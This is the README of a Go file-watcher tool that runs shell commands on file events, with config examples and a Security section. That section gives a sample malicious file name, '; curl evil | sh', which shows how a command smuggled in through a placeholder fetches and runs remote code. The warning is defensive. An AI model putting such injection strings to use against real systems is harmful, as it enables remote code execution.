# Watcher 👁️

[![CI](https://github.com/hrtsegv/watcher/actions/workflows/ci.yml/badge.svg)](https://github.com/hrtsegv/watcher/actions/workflows/ci.yml)
[![Go Version](https://img.shields.io/badge/go-1.25+-blue.svg)](https://golang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A next-generation file system watcher that **automates your workflow** with surgical precision. 
React to file changes like a pro!

```text
                 _      __ ______ / /_ _____ / /_   ___   _____
                | | /| / // __  // __// ___// __ \ / _ \ / ___/
                | |/ |/ // /_/ // /_ / /__ / / / //  __// /    
                |__/|__/ \____/ \__/ \___//_/ /_/ \___//_/     
                                                                
```

## Why Watcher? 🚀

Tired of manually restarting services or rebuilding projects? Watcher combines:

✅ **Precision Targeting** - Globs/patterns for surgical reaction  
⚡ **Workflow Chaining** - Parallel/sequential command execution  
🔔 **Smart Notifications** - Success/failure hooks with rich context  

Perfect for: Go devs • DevOps • Content creators • Data engineers

## Features ✨

- 🔍 **Event Types**: `write`|`create`|`remove`|`rename`|`chmod`|`common`
- 🎯 **Glob Patterns**: `**/*.go` `!**/testdata/` `config/*.{yaml,yml}`
- ⏱️ **Timeout Control**: Prevent hung commands from blocking your flow
- 🌍 **Env Variables**: `$FILE` `$EVENT_TYPE` `$TIMESTAMP` [→ Full list](#environment-variables-)
- 🧩 **Modular Rules**: Combine commands in parallel/sequence
- 📡 **Notifications**: Webhooks, desktop alerts, custom scripts

## Installation ⚡

### From Source
```bash
go install github.com/hrtsegv/watcher@latest
```

### Prebuilt Binaries
Download from [Releases](https://github.com/hrtsegv/watcher/releases)

## Quick Start 🚀

1. Create `watcher.yaml`:
```yaml
# Restart Go server on *.go changes
write:
  - pattern: "**/*.go"
    commands: ["pkill -SIGINT myapp", "go run ."]
    timeout: 30s
    on_success: ["notify-send 'Server reloaded!'"]
```

2. Start watching:
```bash
watcher --file watcher.yaml --recursive
```

## CLI Options 🛠️

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--file` | `-f` | path to configuration file (required) | |
| `--path` | `-p` | path to watch | `.` |
| `--recursive` | `-r` | watch directories recursively | `false` |
| `--debounce` | `-b` | debounce interval (e.g., `400ms`, `1s`) | `400ms` |
| `--debug` | `-d` | enable debug logging | `false` |
| `--version` | `-v` | print version information and exit | |
| `--dry-run` | | log which commands would run without executing them | `false` |

## Configuration Guide 📋

### Example Config
```yaml
# Global settings
debounce: 500ms      # Debounce interval (default: 400ms)
exclude_dirs:         # Extra directory names to never watch/descend into
  - "coverage"        # (merged with built-in defaults: node_modules, vendor, .git, dist, ...)

write:
  - pattern: "src/**/*.js"
    commands:
      - "npm run lint"
      - "npm run build"
    sequential: true      # Run commands in order
    timeout: 1m            # Fail if build takes >1 minute
    on_success: ["echo 'All systems go! 🚀'"]
    on_failure: ["curl -X POST https://api.status.io/down"]

create:
  - pattern: "*.{jpg,png}"
    commands: ["convert $FILE -resize 50% resized/$FILE_BASE"]
```
`on_success`/`on_failure` are configured per-rule (there's no global/top-level hook) — every rule that runs commands can define its own.

### Glob Pattern Syntax 🎯

Patterns (`pattern` on a rule, and entries in `include`/`watch`/`exclude`) are matched with
[doublestar](https://github.com/bmatcuk/doublestar), which extends standard shell globs with:

| Syntax | Meaning |
|--------|---------|
| `*` | any sequence of non-separator characters |
| `**` | zero or more directories, e.g. `**/*.go` matches `main.go` and `a/b/c/main.go` |
| `{a,b,c}` | alternatives, e.g. `*.{jpg,png}` |
| `!pattern` | negates the match as an *exception* within the same list |

A leading `!` carves an exception out of the rest of the list it appears in — it does not
follow `.gitignore`-style ordering. For example:
```yaml
include:
  - "**/*.go"
  - "!**/testdata/**"   # every .go file except under testdata/
```
A single rule's `pattern` can also be negated on its own, e.g. `pattern: "!**/*_test.go"`
matches any file that is *not* a `_test.go` file.

### Command Placeholders 🧩

In addition to environment variables, you can use Go `text/template` style placeholders for dynamic command expansion:

| Placeholder      | Description                      |
|------------------|----------------------------------|
| `{{.Path}}`      | Full path to changed file        |
| `{{.Base}}`      | Filename only (e.g., `app.go`)   |
| `{{.Dir}}`       | Parent directory of file         |
| `{{.Ext}}`       | The extension of the file        |
| `{{.Op}}`        | Event type (`WRITE`, `CREATE`)   |
| `{{.Time}}`      | RFC3339 formatted time           |
| `{{.Timestamp}}` | Unix timestamp of event          |
| `{{.PWD}}`       | Current working directory        |

Example:
```yaml
write:
  - pattern: "src/**/*.go"
    commands:
      - echo "File {{.Base}} was modified in {{.Dir}} at {{.Time}}"
```

A `quote` function is also available for safely embedding a placeholder that might
contain shell metacharacters (see [Security](#security-)):
```yaml
create:
  - pattern: "uploads/**"
    commands:
      - clamscan {{.Path | quote}} --move=/quarantine
```

### Environment Variables 🌍

| Variable       | Description                      |
|----------------|----------------------------------|
| `$FILE`        | Full path to changed file        |
| `$FILE_BASE`   | Filename only (e.g., `app.go`)   |
| `$FILE_DIR`    | Parent directory of file         |
| `$FILE_EXT`    | The extension of the file        |
| `$EVENT_TYPE`  | Event type (`WRITE`, `CREATE`)   |
| `$EVENT_TIME`  | RFC3339 formatted time           |
| `$TIMESTAMP`   | Unix timestamp of event          |
| `$PWD`         | Current working directory        |


## Security 🔒

Commands run through a real shell (`sh -c` on Linux/macOS, `cmd /C` on Windows), and
`{{...}}` template placeholders are substituted directly into the command *text* before
that shell parses it. If you watch a directory where file names aren't trusted (uploads,
scans, anything a third party can write to) and use a placeholder like `{{.Base}}` in a
command, a file crafted with shell metacharacters in its name (e.g. `` `; curl evil | sh` ``)
can inject arbitrary commands.

- Prefer the `$FILE`/`$FILE_BASE`/... environment variables over `{{...}}` placeholders
  for untrusted names — they're passed to the child process as real argv/env values, not
  spliced into the command text, so they can't inject a new command (still quote them,
  e.g. `"$FILE"`, so a name containing spaces is treated as one argument).
- If you do need a placeholder (e.g. to build a path), wrap it with the `quote` template
  function: `{{.Base | quote}}` shell-escapes the value for whichever shell `watcher` will
  invoke on the current OS.
- On Windows, be aware `cmd.exe` has no fully safe quoting story (`%VAR%` is still expanded
  inside double quotes) — `quote` neutralizes the common cases but isn't a hard guarantee
  the way POSIX single-quoting is.

## Real-World Examples 🛠️

### 1. File Sync
```yaml
# Sync new images to S3
create:
  - pattern: "uploads/*.{jpg,png}"
    commands: ["aws s3 cp $FILE s3://my-bucket/$FILE_BASE"]
```

### 2. Secure Service Management
```yaml
# Restart NGINX when config changes (with privilege escalation)
write:
  - pattern: "/etc/nginx/**/*.conf"
    commands: ["sudo nginx -t", "sudo systemctl reload nginx"]
    timeout: 15s
    on_failure: ["logger -t watcher 'NGINX reload failed'"]
```

### 3. Malware Scanning Pipeline
```yaml
# Scan new uploads with ClamAV → quarantine if infected
create:
  - pattern: "/var/www/uploads/**/*.{exe,zip}"
    commands:
      - 'clamscan "$FILE" --move=/quarantine'
      - 'curl -X POST http://localhost:8080/alert -d "Infected: {{.Base | quote}}"'
    timeout: 2m
```

### 4. Database Backup Trigger
```yaml
# Create encrypted backup when DB schema changes
write:
  - pattern: "schema/*.sql"
    commands:
      - "pg_dump -Fc mydb | age -p > backup/$(date +%s).dump.age"
    on_success: ["aws s3 cp backup/ s3://dbsnapshots/ --recursive"]
    on_failure: ["pagerduty trigger 'Backup failed'"]
```

### 5. CI/CD for Go Modules
```yaml
# Full pipeline on dependency changes
write:
  - pattern: "**/go.mod"
    commands:
      - "go mod verify"
      - "go mod tidy"
      - "go test ./..."
    sequential: true
    timeout: 5m
```

### 6. Real-Time Sync to Edge Servers
```yaml
# Sync changed assets to CDN nodes in parallel 
write:
  - pattern: "static/**/*.{css,js}"
    commands:
      - "rsync -az $FILE edge-node-1:/var/www/"
      - "rsync -az $FILE edge-node-2:/var/www/"
      - "rsync -az $FILE edge-node-3:/var/www/"
    on_success: ["invalidate-cdn $FILE_ABS"]
```

### 7. Smart Log Management
```yaml
# Rotate logs over 100MB
write:
  - pattern: "/var/log/app/*.log"
    commands: 
      - "[[ $(stat -c%s $FILE) -gt 100000000 ]] && gzip $FILE"
    on_success: ["touch $FILE"]  # Reset write time
```

### 8. Kubernetes Config Hot-Reload
```yaml
# Update configmap without pod restart
write:
  - pattern: "k8s/configs/*.yaml"
    commands:
      - "kubectl create configmap app-config --from-file=$FILE -o yaml --dry-run=client | kubectl apply -f -"
    timeout: 30s
```

### 9. Dynamic Firewall Rules
```yaml
# Block IPs added to denylist
write:
  - pattern: "/etc/iptables/denylist.txt"
    commands: ["iptables-restore < /etc/iptables/rules.v4"]
    on_failure: ["fail2ban-client set sshd banip $(tail -1 $FILE)"]
```

## Command Line Options ⚙️

```text
-f, --file        Configuration file (required)
-p, --path        Directory to watch (default: current)
-d, --debug       Enable debug-level logs
-r, --recursive   Watch directories recursively
-v, --version     Print version information and exit
    --dry-run     Log which commands would run without executing them
```

## Acknowledgements 💛

Built with these awesome libraries:
- [fsnotify](https://github.com/fsnotify/fsnotify) - File system notifications
- [go-arg](https://github.com/alexflint/go-arg) - CLI argument parsing
- [doublestar](https://github.com/bmatcuk/doublestar) - Glob pattern matching

---

**Watcher** © 2025 - MIT License | Crafted with ❤️ by [hrtsegv](https://github.com/hrtsegv)
